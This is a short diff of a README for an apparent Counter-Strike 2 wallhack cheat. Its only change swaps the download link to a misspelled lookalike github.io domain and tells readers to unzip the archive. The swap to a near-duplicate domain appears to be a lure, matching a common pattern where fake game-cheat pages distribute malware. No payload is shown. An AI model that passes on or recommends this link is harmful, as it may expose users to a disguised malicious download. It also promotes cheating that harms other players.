@@ -6,7 +6,7 @@ CS 2 WH is a wallhack overlay for Counter-Strike 2 that enhances player awarenes
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://cs2-wallhack-windows.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge)](https://cs2-walhack-windows.github.io/.github/)
 
 Unzip the archive to a separate folder.  
 
